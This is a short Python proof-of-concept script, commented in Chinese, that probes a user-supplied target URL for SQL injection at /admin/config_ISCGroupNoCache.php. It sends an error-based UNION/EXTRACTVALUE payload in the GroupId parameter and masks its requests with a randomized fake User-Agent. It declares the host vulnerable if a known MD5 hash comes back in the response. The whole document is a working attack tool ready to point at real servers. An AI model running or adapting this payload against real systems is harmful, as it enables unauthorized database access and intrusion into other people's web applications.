import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的GET请求。存在问题的路径为/admin/config_ISCGroupNoCache.php',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送get请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/admin/config_ISCGroupNoCache.php"  # 移除末尾的斜杠
    else:
        url = args.url + "/admin/config_ISCGroupNoCache.php"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': fake.user_agent(),
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept-Encoding': 'gzip'
}

params = {
    "GroupId": "1 UNION ALL SELECT EXTRACTVALUE(1, concat(0x7e, (SELECT MD5(123123)), 0x7e))"
}


response = requests.get(url, headers=headers,params=params)
if "4297F44B13955235245B2497399D7A93" in response.text:
    print("目标url："+ url + '\n' +"可能存在该漏洞"+ '/n'+ '返回内容为' + response.text)
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")